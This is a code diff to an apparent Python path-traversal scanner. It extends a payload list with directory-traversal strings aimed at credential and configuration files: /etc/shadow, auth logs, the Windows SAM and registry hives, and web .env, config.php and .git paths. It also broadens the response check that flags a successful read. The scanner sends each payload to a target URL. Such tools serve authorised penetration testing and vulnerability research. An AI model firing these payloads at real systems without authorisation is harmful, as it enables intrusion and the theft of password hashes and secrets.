@@ -23,10 +23,41 @@ def display_banner(banner_file):
 
 # List of payloads to test for path traversal vulnerabilities
 payloads = [
+    # Linux/Unix sensitive files
     "../../etc/passwd",
     "../../../../etc/passwd",
+    "../../etc/shadow",
+    "../../../../etc/shadow",
+    "../../etc/hosts",
+    "../../../../etc/hosts",
+    "../../etc/hostname",
+    "../../../../etc/hostname",
+    "../../etc/issue",
+    "../../../../etc/issue",
+    "../../var/log/auth.log",
+    "../../../../var/log/auth.log",
+    "../../var/log/syslog",
+    "../../../../var/log/syslog",
+    
+    # Windows sensitive files
+    "../../windows/system32/config/SAM",
+    "../../../../windows/system32/config/SAM",
+    "../../windows/system32/config/system",
+    "../../../../windows/system32/config/system",
     "../../windows/system32/drivers/etc/hosts",
-    "../../../../windows/system32/drivers/etc/hosts"
+    "../../../../windows/system32/drivers/etc/hosts",
+    "../../windows/system32/config/software",
+    "../../../../windows/system32/config/software",
+    "../../windows/system32/repair/SAM",
+    "../../../../windows/system32/repair/SAM",
+    
+    # Web server configuration files
+    "../../var/www/html/.env",
+    "../../../../var/www/html/.env",
+    "../../var/www/html/config.php",
+    "../../../../var/www/html/config.php",
+    "../../var/www/html/.git",
+    "../../../../var/www/html/.git"
 ]
 
 # Function to write results to a log file
@@ -46,7 +77,7 @@ def test_url_for_traversal(url, log_file):
         try:
             response = requests.get(test_url, timeout=5)
             # Check for signs of successful path traversal:
-            if "root:x" in response.text or "127.0.0.1" in response.text:
+            if "root:x" in response.text or "127.0.0.1" in response.text or "user:" in response.text or "SAM" in response.text:
                 result = f"[+] Potential Vulnerability Found! Payload: {test_url}"
                 print(result)
                 log_result(log_file, result)
